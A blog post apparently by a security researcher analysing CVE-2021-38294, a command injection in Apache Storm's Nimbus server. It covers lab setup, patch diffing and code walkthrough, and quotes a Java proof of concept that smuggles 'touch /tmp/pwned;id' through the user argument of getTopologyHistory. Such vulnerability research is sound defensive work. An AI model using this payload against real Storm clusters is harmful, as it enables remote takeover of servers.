<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>CVE-2021-38294: Apache Storm Nimbus Command Injection - Zeyad Azima</title>
<meta name="description" content="Command Injection vulnerability that affects Nimbus server in apache storm. ">


  <meta name="author" content="Zeyad Azima">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zeyad Azima">
<meta property="og:title" content="CVE-2021-38294: Apache Storm Nimbus Command Injection">
<meta property="og:url" content="http://localhost:5000/security%20research/CVE_2021_38294/">


  <meta property="og:description" content="Command Injection vulnerability that affects Nimbus server in apache storm. ">



  <meta property="og:image" content="http://localhost:5000/assets/images/clj4188w109xs0umzd5r94z6w.png">





  <meta property="article:published_time" content="2023-06-20T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:5000/security%20research/CVE_2021_38294/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Zeyad Azima",
      "url": "http://localhost:5000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zeyad Azima
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Security-Research">Security Research</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#MacOS">MacOS</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#General">General</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Certificates">Certificates</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="CVE-2021-38294: Apache Storm Nimbus Command Injection">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2023-06-20T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2021-38294: Apache Storm Nimbus Command Injection
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  12 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#what-is-apache-storm-">What is Apache Storm ?</a></li>
  <li><a href="#testing-lab">Testing Lab</a></li>
  <li><a href="#patch-diffing">Patch Diffing</a></li>
  <li><a href="#the-analysis">The Analysis</a></li>
  <li><a href="#exploitation">Exploitation</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#resources">Resources</a></li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction"><strong>Introduction</strong></h1>

<p>#CVE-2021-38294 is a Command Injection vulnerability that affects Nimbus server in apache storm in <code class="language-plaintext highlighter-rouge">getTopologyHistory</code> services, A successful crafted request to Nimbus server will result in exploitation for this vulnerability will lead to execute malicious command &amp; takeover the server. The affected versions are <code class="language-plaintext highlighter-rouge">1.x</code> prior to <code class="language-plaintext highlighter-rouge">1.2.4</code> &amp; <code class="language-plaintext highlighter-rouge">2.x</code> prior to <code class="language-plaintext highlighter-rouge">2.2.1</code>.</p>

<h1 id="what-is-apache-storm-"><strong>What is Apache Storm ?</strong></h1>

<p><code class="language-plaintext highlighter-rouge">Apache Storm</code> is a distributed system for processing big data in real-time, Specifically designed to handle large volumes of data in a reliable and scalable manner and It operates as a streaming data framework allowing for high ingestion rates and efficient data processing. While it is stateless, Storm effectively manages distributed environments and cluster states through Apache ZooKeeper. It provides a straightforward approach to performing parallel manipulations on real-time data, enabling a wide range of data processing tasks. Apache Storm is extensively used by a lot of enterprises/organizations such as Twitter for processing tweets and clicks in its <code class="language-plaintext highlighter-rouge">Publisher Analytics Products</code> suite, benefiting from deep integration with the Twitter infrastructure.</p>

<p><img src="/assets/images/e7d7fe41e817f46ef2fcbfca93b041d3" alt="" /></p>

<p>In <code class="language-plaintext highlighter-rouge">Apache Storm</code> spouts and bolts are connected to form a topology, which represents the real-time application logic as a directed graph. Spouts emit data that is processed by bolts, and the output of a bolt can be passed to another bolt. storm keeps the topology running until explicitly stopped. The execution of spouts and bolts in storm is referred to as <code class="language-plaintext highlighter-rouge">tasks</code>. Each spout and bolt can have multiple instances running in separate threads. These tasks are distributed across multiple worker nodes, and the worker nodes listen for jobs and manage the execution of tasks. Finally, What we will need to know well are <code class="language-plaintext highlighter-rouge">Nimbus</code> known as master node which plays a central role in the storm framework as it is responsible for running the storm topology by analyzes the topology and collects the tasks to be executed, distributing them to an available <code class="language-plaintext highlighter-rouge">Supervisor</code> node and <code class="language-plaintext highlighter-rouge">Supervisor</code> is the worker node which can have multiple worker processes, It’s job is to delegate the tasks to these worker processes &amp; each worker process can spawn multiple executors based on the required workload and executes the assigned tasks and communication between the <code class="language-plaintext highlighter-rouge">Nimbus</code> and <code class="language-plaintext highlighter-rouge">Supervisors</code> is facilitated through an internal distributed messaging system ensuring efficient coordination and data exchange within the storm cluster.</p>

<h1 id="testing-lab"><strong>Testing Lab</strong></h1>

<p>Let’s start to build our testing lab. First, We would need <code class="language-plaintext highlighter-rouge">ZooKeeper</code> to be installed you can download it from <a href="https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz">here</a>. After downloading, extract it and create a directory <code class="language-plaintext highlighter-rouge">data</code> within <code class="language-plaintext highlighter-rouge">Zookeeper</code> directory:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir data
</code></pre></div></div>

<p><img src="/assets/images/aeb1313435fb2b8fcfb82dae80799bc5" alt="" /></p>

<p>Next, Copy the sample configuration as a main configuration file for <code class="language-plaintext highlighter-rouge">Zookeeper</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp conf/zoo_sample.cfg conf/zoo.cfg
</code></pre></div></div>

<p><img src="/assets/images/46bc259bde835336beb36bac9b7ec2f0" alt="" /></p>

<p>Open <code class="language-plaintext highlighter-rouge">zoo.cfg</code> file and add the <code class="language-plaintext highlighter-rouge">data</code> directory file path we created previously:</p>

<p><img src="/assets/images/84e8c721a93f81d4e1e54655363687c2" alt="" /></p>

<p>Now, Start <code class="language-plaintext highlighter-rouge">ZooKeeper</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bin/zkServer.sh start
</code></pre></div></div>

<p><img src="/assets/images/434a39527b2c966b744da1fdc46ae7a8" alt="" /></p>

<p>The server started and verify it by running the <code class="language-plaintext highlighter-rouge">CLI</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bin/zkCli.sh
</code></pre></div></div>

<p><img src="/assets/images/d642fa2dc7cff948a2879d2e1b3789c9" alt="" /></p>

<p>Now, It’s time to install &amp; start <code class="language-plaintext highlighter-rouge">Apache Storm</code>, Download it from <a href="https://archive.apache.org/dist/storm/apache-storm-2.2.0/apache-storm-2.2.0.zip">here</a>. First, Create another folder inside of <code class="language-plaintext highlighter-rouge">apache storm</code> directory by the name <code class="language-plaintext highlighter-rouge">data</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir data
</code></pre></div></div>

<p><img src="/assets/images/afd9db9f7e178dc2f43cd050a84cd2ec" alt="" /></p>

<p>After that open the configurations file <code class="language-plaintext highlighter-rouge">conf/storm.yaml</code> and add the following to the file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Storm configuration file

# Nimbus settings
nimbus.seeds: ["localhost"]  # List of Nimbus hostnames or IP addresses
nimbus.host: "localhost"
# ZooKeeper settings
storm.zookeeper.servers:
  - "localhost"

# Storm UI settings
ui.port: 8081  

# Supervisor settings
supervisor.slots.ports:
  - 6700
  - 6701
  - 6702

# Worker settings
worker.childopts: "-Xmx768m"

# Topology settings
topology.debug: true  # Enable debugging for topologies
topology.max.spout.pending: 1000  # Maximum number of pending messages per spout

# Log4j settings
worker.log.level: INFO  # Log level for Storm workers
</code></pre></div></div>

<p>Don’t forget to replace the <code class="language-plaintext highlighter-rouge">Zookeper</code> &amp; <code class="language-plaintext highlighter-rouge">Nimbus</code> server IP with your IP (<code class="language-plaintext highlighter-rouge">The same machine IP</code>). Let’s start it now. Starting <code class="language-plaintext highlighter-rouge">Nimbus</code> server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bin/storm nimbus
</code></pre></div></div>

<p><img src="/assets/images/a8d97c6b9356f7ea1f66d85a8a341be7" alt="" /></p>

<p>Starting <code class="language-plaintext highlighter-rouge">Supervisor</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bin/storm supervisor
</code></pre></div></div>

<p><img src="/assets/images/a6db4dcb61df7bec3e57df469791c333" alt="" /></p>

<p>Starting <code class="language-plaintext highlighter-rouge">Storm</code> UI:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bin/storm ui
</code></pre></div></div>

<p><img src="/assets/images/6d0290ec4da1a168b79d1af8f5ecb3bd" alt="" /></p>

<p>Visit the <code class="language-plaintext highlighter-rouge">UI</code> on port <code class="language-plaintext highlighter-rouge">8081</code> as we configure:</p>

<p><img src="/assets/images/4ffa3e343ddb79408313188cde0ac84a" alt="" /></p>

<h1 id="patch-diffing"><strong>Patch Diffing</strong></h1>

<p>You can download the source code from <a href="https://archive.apache.org/dist/storm/apache-storm-2.2.0/apache-storm-2.2.0-src.zip">here</a>, The patch <a href="https://github.com/apache/storm/commit/aa67da56da0e21506624ea9ad12b35b630d28dc8">here</a> on github.</p>

<p><img src="/assets/images/0d350f6390d87bdaeacdb03dcbbfe269" alt="" /></p>

<p>It shows us changes made to <code class="language-plaintext highlighter-rouge">storm-client/src/jvm/org/apache/storm/utils/ShellUtils.java</code> where the <code class="language-plaintext highlighter-rouge">getGroupsCommand()</code> method got deleted which was return a command as a string array to retrieve the groups on the system. Then, the following function modified:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##### Before
public static String[] getGroupsForUserCommand(final String user) {
        if (WINDOWS) {
            throw new UnsupportedOperationException("Getting user groups is not supported on Windows");
        }
        //'groups username' command return is non-consistent across different unixes
        return new String[]{
            "bash", "-c", "id -gn " + user
                          + "&amp;&amp; id -Gn " + user
        };
    }
    
##### After
public static String[] getGroupsForUserCommand(final String user) {
        if (WINDOWS) {
            throw new UnsupportedOperationException("Getting user groups is not supported on Windows");
        }
        //'groups username' command return is non-consistent across different unixes
        return new String[]{"id", "-Gn", user};
    }
</code></pre></div></div>

<p>The modification of <code class="language-plaintext highlighter-rouge">getGroupsForUserCommand(String user)</code> has been updated to use a more concise command. We can see clearly from the patch diffing that the Command Injection Occures in this part specifically in <code class="language-plaintext highlighter-rouge">user</code> parameter that get passed to the <code class="language-plaintext highlighter-rouge">getGroupsForUserCommand()</code> and also we can notice the <code class="language-plaintext highlighter-rouge">bach -c</code> in the <code class="language-plaintext highlighter-rouge">String</code> array, Let’s move to the analysis to understand how this happens.</p>

<h1 id="the-analysis"><strong>The Analysis</strong></h1>

<p>When we go to the <code class="language-plaintext highlighter-rouge">apache-storm-2.2.0/storm-client/src/jvm/org/apache/storm/utils/ShellUtils.java</code> and scroll down after <code class="language-plaintext highlighter-rouge">getGroupsForUserCommand()</code> method we can see the following:</p>

<p><img src="/assets/images/071a30962a11aaa9452080ee1fb85dd0" alt="" /></p>

<p>This <code class="language-plaintext highlighter-rouge">run()</code> method is declared as <code class="language-plaintext highlighter-rouge">protected</code> which means it can only be accessed within the same package or by sub-classes and it implements a control flow that determines whether a specified interval has passed since the last execution, If the interval has passed it will reset the <code class="language-plaintext highlighter-rouge">exitCode</code> and proceeds to execute the <code class="language-plaintext highlighter-rouge">runCommand()</code> method. Now, By scrolling down:</p>

<p><img src="/assets/images/8d01c699df06d9ae7b48b3d7c4c8f65a" alt="" /></p>

<p>We will be able to see the <code class="language-plaintext highlighter-rouge">runCommand()</code> method and It’s a long method, So let’s break it down and explain it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ProcessBuilder builder = new ProcessBuilder(getExecString());
Timer timeOutTimer = null;
ShellTimeoutTimerTask timeoutTimerTask = null;
timedOut = new AtomicBoolean(false);
completed = new AtomicBoolean(false);
</code></pre></div></div>

<p>First, It creates a new <code class="language-plaintext highlighter-rouge">ProcessBuilder</code> object with the executable command obtained from the <code class="language-plaintext highlighter-rouge">getExecString()</code> method:</p>

<p><img src="/assets/images/951bdb4a55a94fc5a69d461952ebde51" alt="" /></p>

<p>Here is the <code class="language-plaintext highlighter-rouge">getExecString()</code> method which returns the command value. Then, it declares two variables of type <code class="language-plaintext highlighter-rouge">Timer</code> and <code class="language-plaintext highlighter-rouge">ShellTimeoutTimerTask</code> as <code class="language-plaintext highlighter-rouge">null</code> which will be used to handle timeouts for the command execution. Finally, Creates two <code class="language-plaintext highlighter-rouge">AtomicBoolean</code> variables named <code class="language-plaintext highlighter-rouge">timedOut</code> and <code class="language-plaintext highlighter-rouge">completed</code> &amp; initializes them with the value <code class="language-plaintext highlighter-rouge">false</code> which used to track the status of the command execution.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (environment != null) {
    builder.environment().putAll(this.environment);
}
if (dir != null) {
    builder.directory(this.dir);
}

builder.redirectErrorStream(redirectErrorStream);
process = builder.start();
</code></pre></div></div>

<p>The first <code class="language-plaintext highlighter-rouge">if</code> condition checks if the <code class="language-plaintext highlighter-rouge">environment</code> variable is not <code class="language-plaintext highlighter-rouge">null</code> and If it’s not <code class="language-plaintext highlighter-rouge">null</code>, it retrieves the environment variables associated with the <code class="language-plaintext highlighter-rouge">ProcessBuilder</code> instance using <code class="language-plaintext highlighter-rouge">builder.environment()</code> and adds all the key value pairs from the <code class="language-plaintext highlighter-rouge">this.environment</code> map. The second <code class="language-plaintext highlighter-rouge">if</code> condition checks if the <code class="language-plaintext highlighter-rouge">dir</code> variable is not <code class="language-plaintext highlighter-rouge">null</code> and If it’s not <code class="language-plaintext highlighter-rouge">null</code>, it sets the working directory of the process to the specified directory <code class="language-plaintext highlighter-rouge">t his.dir</code> using <code class="language-plaintext highlighter-rouge">builder.directory(this.dir)</code>. Finally, it’s configuring the <code class="language-plaintext highlighter-rouge">ProcessBuilder</code> to redirect the error stream of the process to the same output stream If <code class="language-plaintext highlighter-rouge">redirectErrorStream</code> is set to <code class="language-plaintext highlighter-rouge">true</code> the error stream will be merged with the standard output stream and then starts the process using the configured <code class="language-plaintext highlighter-rouge">ProcessBuilder</code> by calling the <code class="language-plaintext highlighter-rouge">start()</code> method.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (timeOutInterval &gt; 0) {
    timeOutTimer = new Timer("Shell command timeout");
    timeoutTimerTask = new ShellTimeoutTimerTask(this);
    //One time scheduling.
    timeOutTimer.schedule(timeoutTimerTask, timeOutInterval);
}
final BufferedReader errReader =
    new BufferedReader(new InputStreamReader(process
                                                 .getErrorStream()));
BufferedReader inReader =
    new BufferedReader(new InputStreamReader(process
                                                 .getInputStream()));
final StringBuffer errMsg = new StringBuffer();

// read error and input streams as this would free up the buffers
// free the error stream buffer
Thread errThread = new Thread() {
</code></pre></div></div>

<p>Moving to here this <code class="language-plaintext highlighter-rouge">IF</code> condition checks if the <code class="language-plaintext highlighter-rouge">timeOutInterval</code> is greater than <code class="language-plaintext highlighter-rouge">0</code>, then set up a timer <code class="language-plaintext highlighter-rouge">Shell command timeout</code> task to handle the timeout and schedule the <code class="language-plaintext highlighter-rouge">timeoutTimerTask</code> to run after the specified <code class="language-plaintext highlighter-rouge">timeOutInterval</code> in milliseconds. After that create 2 <code class="language-plaintext highlighter-rouge">BufferedReader</code> objects which are <code class="language-plaintext highlighter-rouge">errReader</code> and <code class="language-plaintext highlighter-rouge">inReader</code> to read the error and input streams of the process, respectively. The <code class="language-plaintext highlighter-rouge">process.getErrorStream()</code> and <code class="language-plaintext highlighter-rouge">process.getInputStream()</code> methods return the streams associated with the running process. Next, a <code class="language-plaintext highlighter-rouge">StringBuffer</code> object named <code class="language-plaintext highlighter-rouge">errMsg</code> to store the error message, a new <code class="language-plaintext highlighter-rouge">Thread</code> object named <code class="language-plaintext highlighter-rouge">errThread</code> then create an anonymous subclass of <code class="language-plaintext highlighter-rouge">Thread</code> with overridden <code class="language-plaintext highlighter-rouge">run()</code> method.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@Override
public void run() {
    try {
        String line = errReader.readLine();
        while ((line != null) &amp;&amp; !isInterrupted()) {
            errMsg.append(line);
            errMsg.append(System.getProperty("line.separator"));
            line = errReader.readLine();
        }
    } catch (IOException ioe) {
        LOG.warn("Error reading the error stream", ioe);
    }
}
};
try {
errThread.start();
} catch (IllegalStateException ise) {
//ignore
}
try {
parseExecResult(inReader); // parse the output
// clear the input stream buffer
String line = inReader.readLine();
while (line != null) {
    line = inReader.readLine();
}
// wait for the process to finish and check the exit code
exitCode = process.waitFor();
// make sure that the error thread exits
joinThread(errThread);
completed.set(true);
//the timeout thread handling
//taken care in finally block
if (exitCode != 0) {
    throw new ExitCodeException(exitCode, errMsg.toString());
}
} catch (InterruptedException ie) {
throw new IOException(ie.toString());
} finally {
if (timeOutTimer != null) {
    timeOutTimer.cancel();
}
// close the input stream
try {
    // JDK 7 tries to automatically drain the input streams for us
    // when the process exits, but since close is not synchronized,
    // it creates a race if we close the stream first and the same
    // fd is recycled.  the stream draining thread will attempt to
    // drain that fd!!  it may block, OOM, or cause bizarre behavior
    // see: https://bugs.openjdk.java.net/browse/JDK-8024521
    //      issue is fixed in build 7u60
    InputStream stdout = process.getInputStream();
    synchronized (stdout) {
        inReader.close();
    }
} catch (IOException ioe) {
    LOG.warn("Error while closing the input stream", ioe);
}
if (!completed.get()) {
    errThread.interrupt();
    joinThread(errThread);
}
try {
    InputStream stderr = process.getErrorStream();
    synchronized (stderr) {
        errReader.close();
    }
} catch (IOException ioe) {
    LOG.warn("Error while closing the error stream", ioe);
}
process.destroy();
lastTime = System.currentTimeMillis();
}
</code></pre></div></div>

<p>Finally, In a summary defines a thread that reads the error stream and appends its contents to the <code class="language-plaintext highlighter-rouge">errMsg</code> <code class="language-plaintext highlighter-rouge">StringBuffer</code> and start the thread &amp; then proceeds to parse the output from the input stream using the <code class="language-plaintext highlighter-rouge">parseExecResult</code> method. After that, the input stream clear its buffer. Then, wait for the process to finish and retrieves the exit code. Next, It ensure that the error thread has exited by joining it and If the exit code is not zero, it throws an <code class="language-plaintext highlighter-rouge">ExitCodeException</code> with the error message. In the <code class="language-plaintext highlighter-rouge">finally</code> block, it cancel the timeout timer if it exists, closes the input stream, interrupts the error thread if the command execution is not completed, closes the error stream, destroys the process, and updates the <code class="language-plaintext highlighter-rouge">lastTime</code> variable with the current time. So, Now how actually the code can get injected or where is the point that the user give the malicious input ?. Let’s discover it by going through the <code class="language-plaintext highlighter-rouge">PoC</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import org.apache.storm.utils.NimbusClient;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class ThriftClient {
    public static void main(String[] args) throws Exception {
        HashMap config = new HashMap();
        List&lt;String&gt; seeds = new ArrayList&lt;String&gt;();
        seeds.add("localhost");
        config.put("storm.thrift.transport", "org.apache.storm.security.auth.SimpleTransportPlugin");
        config.put("storm.thrift.socket.timeout.ms", 60000);
        config.put("nimbus.seeds", seeds);
        config.put("storm.nimbus.retry.times", 5);
        config.put("storm.nimbus.retry.interval.millis", 2000);
        config.put("storm.nimbus.retry.intervalceiling.millis", 60000);
        config.put("nimbus.thrift.port", 6627);
        config.put("nimbus.thrift.max_buffer_size", 1048576);
        config.put("nimbus.thrift.threads", 64);
        NimbusClient nimbusClient = new NimbusClient(config, "localhost", 6627);

        // send attack
        nimbusClient.getClient().getTopologyHistory("foo;touch /tmp/pwned;id ");
    }
}
</code></pre></div></div>

<p>When we take a look here at the <code class="language-plaintext highlighter-rouge">PoC</code> we can notice that it’s connecting to <code class="language-plaintext highlighter-rouge">Storm</code> cluster by adding the configuration first. Then connect to the cluster at <code class="language-plaintext highlighter-rouge">localhost</code> on port <code class="language-plaintext highlighter-rouge">6627</code> &amp; passing the previous configurations. the call the <code class="language-plaintext highlighter-rouge">getTopologyHistory()</code> function from the <code class="language-plaintext highlighter-rouge">Storm</code> Client. And here where is the command Injection happens. Let’s take a look at the implementation of <code class="language-plaintext highlighter-rouge">Nimbus</code> and the function:</p>

<p><img src="/assets/images/c4386369e509b606168457227840b8ed" alt="" /></p>

<p>When we go under <code class="language-plaintext highlighter-rouge">apache-storm-2.2.0/storm-server/src/main/java/org/apache/storm/nimbus/NimbusHeartbeatsPressureTest.java</code> which is responsible for implementation of a <code class="language-plaintext highlighter-rouge">Nimbus</code> heartbeats pressure test. It starts with defining the class and other variables for configurations.</p>

<p><img src="/assets/images/8dd71a709560b44713aacc29b9f504a8" alt="" /></p>

<p>After that as we can see it starts to initializing the <code class="language-plaintext highlighter-rouge">Config</code> for the heartbeats pressure test. Then by scrolling more down:</p>

<p><img src="/assets/images/3fe9b9aa47d3cfdd227d2678400b1ced" alt="" /></p>

<p>We can see clearly in the <code class="language-plaintext highlighter-rouge">HeartbeatSendTask</code> that it’s using the defined <code class="language-plaintext highlighter-rouge">NimbusClient</code> that named <code class="language-plaintext highlighter-rouge">client</code> to create a new client connection &amp; Passed the previous initialized <code class="language-plaintext highlighter-rouge">Config</code> with <code class="language-plaintext highlighter-rouge">Nimbus</code> Host &amp; Port.</p>

<p><img src="/assets/images/27875c8206737d6b5d83f7e4e221c8b7" alt="" /></p>

<p>Finally, Here we can see it started to connect to the configured <code class="language-plaintext highlighter-rouge">client</code> and call the <code class="language-plaintext highlighter-rouge">sendSupervisorWorkerHeartbeats()</code> method which can be called remotely. Now, if we go to the <code class="language-plaintext highlighter-rouge">apache-storm-2.2.0/storm-server/src/main/java/org/apache/storm/daemon/nimbus/Nimbus.java</code> Class:</p>

<p><img src="/assets/images/963748ef6f8dff1184bb1fadcb2f0bb3" alt="" /></p>

<p>Here we can see the method clearly accessible remotely and also if we search for <code class="language-plaintext highlighter-rouge">getTopologyHistory()</code> method:</p>

<p><img src="/assets/images/f2d166d2cedf722f2c37065a72993abc" alt="" /></p>

<p>Here we can see the method clearly and it takes the <code class="language-plaintext highlighter-rouge">user</code> as an parameter to retrieve the topology history information for a the user. And here where the command get injected, When we back to the first of the analysis at the patch diffing when we return information about user, As the user here can be passed and manupilated by anyone through <code class="language-plaintext highlighter-rouge">getTopologyHistory()</code> method. It will result in malicious command Injection.</p>

<h1 id="exploitation"><strong>Exploitation</strong></h1>

<p>Here we have 2 ways to exploit <code class="language-plaintext highlighter-rouge">CVE-2021-38294</code> an exploit within <code class="language-plaintext highlighter-rouge">Metasploit</code> with metasploit as it’s easy to use and most of us fimalier with it By using the following module:</p>

<p><img src="/assets/images/ecd3642b788a836d78d2583718a78d51" alt="" /></p>

<p>and the 2nd one is a <code class="language-plaintext highlighter-rouge">PoC</code> within <a href="https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/">github</a>.</p>

<h1 id="conclusion"><strong>Conclusion</strong></h1>

<p>Finally, This bug only works on linux as the injectable of the affected component is when getting the information about the user on linux. We saw how this vulnerability happens and the root-cause of the vulnerability &amp; How it can be exploited remotely.</p>

<h1 id="resources"><strong>Resources</strong></h1>

<ul>
  <li>
    <p>https://www.cloudduggu.com/storm/installation/</p>
  </li>
  <li>
    <p>https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</p>
  </li>
  <li>
    <p>https://archive.apache.org/dist/storm/apache-storm-2.2.0/apache-storm-2.2.0.zip</p>
  </li>
</ul>

<p> </p>

<p>#apache #storm #cve #analysis</p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#security-research" class="page__taxonomy-item" rel="tag">Security Research</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-06-20T00:00:00+08:00">June 20, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/security%20research/CVE_2021_44521/" class="pagination--pager" title="CVE-2021-44521: Apache Cassandra Remote Code Execution
">Previous</a>
    
    
